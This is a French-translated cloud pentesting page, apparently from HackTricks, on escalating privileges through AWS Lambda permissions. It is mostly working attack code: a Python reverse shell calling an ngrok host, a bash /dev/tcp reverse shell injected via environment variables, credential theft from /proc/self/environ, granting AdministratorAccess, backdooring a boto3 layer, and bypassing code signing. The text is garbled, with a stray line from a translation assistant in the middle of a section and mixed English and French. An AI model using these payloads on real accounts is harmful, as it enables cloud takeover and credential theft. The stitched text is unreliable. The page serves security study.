# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

Plus d'infos sur lambda dans :

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Les utilisateurs disposant des permissions **`iam:PassRole`, `lambda:CreateFunction` et `lambda:InvokeFunction`** peuvent élever leurs privilèges.\
Ils peuvent **créer une nouvelle Lambda function et lui attribuer un IAM role existant**, accordant à la fonction les permissions associées à ce rôle. L'utilisateur peut ensuite **écrire et uploader du code dans cette Lambda function (par exemple avec un rev shell)**.\
Une fois la fonction configurée, l'utilisateur peut **déclencher son exécution** et les actions prévues en invoquant la Lambda function via l'AWS API. Cette approche permet effectivement à l'utilisateur d'exécuter des tâches indirectement via la Lambda function, en opérant avec le niveau d'accès accordé à l'IAM role qui y est associé.\\

Un attaquant pourrait abuser de cela pour obtenir une **rev shell et voler le token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Vous pouvez également **abuse the lambda role permissions** depuis la lambda function elle-même.\
Si le lambda role avait suffisamment de permissions, vous pourriez l'utiliser pour vous accorder des admin rights :
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Il est aussi possible de leak les identifiants du rôle de la lambda sans nécessiter de connexion externe. Cela serait utile pour **Network isolated Lambdas** utilisées pour des tâches internes. Si des security groups inconnus filtrent vos reverse shells, ce morceau de code va vous permettre de leak directement les identifiants en sortie de la lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impact potentiel :** Privesc direct vers le rôle de service lambda arbitraire spécifié.

> [!CAUTION]
> Notez que même si cela peut sembler intéressant **`lambda:InvokeAsync`** **n'autorise pas** à lui seul **l'exécution de `aws lambda invoke-async`**, vous avez aussi besoin de `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Comme dans le scénario précédent, vous pouvez **vous accorder la permission `lambda:InvokeFunction`** si vous disposez de la permission **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impact potentiel :** privesc direct vers le rôle de service lambda arbitraire spécifié.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Les utilisateurs disposant des permissions **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** (et potentiellement `dynamodb:PutItem` et `dynamodb:CreateTable`) peuvent indirectement **escalader les privilèges** même sans `lambda:InvokeFunction`.\
Ils peuvent créer une **fonction Lambda contenant du code malveillant et lui attribuer un rôle IAM existant**.

Au lieu d'invoquer directement la Lambda, l'utilisateur configure ou utilise une table DynamoDB existante, la reliant à la Lambda via un event source mapping. Cette configuration garantit que la fonction Lambda est **déclenchée automatiquement lors de l'ajout d'un nouvel élément** dans la table, soit par l'action de l'utilisateur, soit par un autre processus, invoquant ainsi indirectement la fonction Lambda et exécutant le code avec les permissions du rôle IAM passé.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Si DynamoDB est déjà actif dans l'environnement AWS, l'utilisateur **n'a qu'à établir l'event source mapping** pour la fonction Lambda. Cependant, si DynamoDB n'est pas utilisé, l'utilisateur doit **créer une nouvelle table** avec le streaming activé :
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Il est maintenant possible de **connecter la fonction Lambda à la table DynamoDB** en **créant un event source mapping** :
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Avec la fonction Lambda liée au DynamoDB stream, l'attaquant peut **déclencher indirectement la fonction Lambda en activant le DynamoDB stream**. Cela peut être accompli en **insérant un élément** dans la table DynamoDB :
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impact potentiel :** Privesc direct vers le rôle de service lambda spécifié.

### `lambda:AddPermission`

Un attaquant disposant de cette permission peut **s'octroyer (ou accorder à d'autres) n'importe quelles permissions** (cela génère des resource based policies pour accorder l'accès à la ressource) :
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Impact potentiel:** Privesc direct sur le lambda service role utilisé en accordant la permission de modifier le code et de l'exécuter.

### `lambda:AddLayerVersionPermission`

Un attaquant disposant de cette permission peut **s'accorder (ou accorder à d'autres) la permission `lambda:GetLayerVersion`**. Il pourrait accéder au layer et rechercher des vulnérabilités ou des informations sensibles.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Impact potentiel :** Accès potentiel à des informations sensibles.

### `lambda:UpdateFunctionCode`

Les utilisateurs disposant de la permission **`lambda:UpdateFunctionCode`** peuvent **modifier le code d'une fonction Lambda existante qui est liée à un rôle IAM.**\
L'attaquant peut **modifier le code de la lambda pour exfiltrer les identifiants IAM**.

Même si l'attaquant n'a pas nécessairement la capacité directe d'invoquer la fonction, si la fonction Lambda est préexistante et opérationnelle, il est probable qu'elle soit déclenchée par des workflows ou des événements existants, facilitant ainsi indirectement l'exécution du code modifié.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Impact potentiel :** Escalade directe (privesc) vers le rôle de service Lambda utilisé.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Avec cette permission, il est possible d'ajouter des variables d'environnement qui feront exécuter du code arbitraire par la Lambda. Par exemple, en python il est possible d'abuser des variables d'environnement `PYTHONWARNING` et `BROWSER` pour faire exécuter à un processus python des commandes arbitraires :
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Pour d'autres langages de script, il existe d'autres env variables que vous pouvez utiliser. Pour plus d'infos, consultez les sous-sections des langages de script dans:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permet d'inclure **code** dans votre fonction lambda mais **de le stocker séparément**, ainsi le code de la fonction peut rester petit et **plusieurs fonctions peuvent partager le code**.

À l'intérieur de lambda, vous pouvez vérifier les chemins d'où le code python est chargé avec une fonction comme la suivante:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Par exemple, la bibliothèque boto3 est chargée depuis `/var/runtime/boto3` (4ème position).

#### Exploitation

Il est possible d'abuser de la permission `lambda:UpdateFunctionConfiguration` pour **ajouter un nouveau layer** à une fonction lambda. Pour exécuter du code arbitraire, ce layer doit contenir une **bibliothèque que la fonction lambda va importer.** Si vous pouvez lire le code de la fonction lambda, vous pouvez le trouver facilement. Notez aussi qu'il est possible que la fonction lambda **utilise déjà un layer** et que vous puissiez **télécharger** le layer et **ajouter votre code** dedans.

Par exemple, supposons que la fonction lambda utilise la bibliothèque boto3 : cela créera un layer local avec la dernière version de la bibliothèque :
```bash
pip3 install -t ./lambda_layer boto3
```
Vous pouvez ouvrir `./lambda_layer/boto3/__init__.py` et **ajouter la backdoor dans le code global** (une fonction pour exfiltrate credentials ou obtenir un reverse shell par exemple).

Ensuite, zippez le répertoire `./lambda_layer` et **téléversez le nouveau lambda layer** dans votre propre compte (ou dans celui de la victime, mais vous pourriez ne pas avoir les permissions pour cela).\
Notez que vous devez créer un dossier python et y placer les bibliothèques pour écraser /opt/python/boto3. De plus, le layer doit être **compatible avec la version de python** utilisée par la lambda et, si vous le téléversez dans votre compte, il doit être dans la **même région :**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Maintenant, rendez le lambda layer téléchargé **accessible par n'importe quel compte** :
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Et attachez le lambda layer à la fonction lambda victime :
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
La prochaine étape serait soit d'**invoquer la fonction** nous-mêmes si possible, soit d'attendre qu'**elle soit invoquée** par des moyens normaux — ce qui est la méthode la plus sûre.

Une **méthode plus discrète pour exploiter cette vulnérabilité** se trouve dans :

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Impact potentiel :** Privesc direct sur le rôle de service lambda utilisé.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Peut-être qu'avec ces permissions vous pouvez créer une fonction et l'exécuter en appelant l'URL... mais je pourrais trouver un moyen de le tester, donc dites-moi si vous le faites !

### Lambda MitM

Certaines lambdas vont **recevoir des informations sensibles des utilisateurs dans les paramètres.** Si vous obtenez RCE dans l'une d'elles, vous pouvez exfiltrate les informations que d'autres utilisateurs lui envoient, consultez-le dans :

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Références

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

If a Lambda function enforces code signing, an attacker who can either remove the Code Signing Config (CSC) or downgrade it to Warn can deploy unsigned code to the function. This bypasses integrity protections without modifying the function's IAM role or triggers.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Chemin A) Supprimer CSC puis mettre à jour le code :
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Voie B) Rétrograder en Warn et mettre à jour le code (si delete n'est pas autorisé) :
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Vérifié — je suivrai les consignes : traduire le texte anglais pertinent en français en conservant exactement la même syntaxe markdown/HTML, ne pas traduire le code, les noms de techniques, les mots comme leak, pentesting, les noms de plateformes cloud (aws, gcp...), ni les liens, chemins, tags, refs, et ne pas ajouter de contenu supplémentaire. Envoyez le contenu à traduire.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Impact potentiel : Possibilité de pousser et d'exécuter du code arbitraire non signé dans une fonction qui était censée imposer des déploiements signés, pouvant potentiellement conduire à l'exécution de code avec les autorisations du rôle de la fonction.

Nettoyage :
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

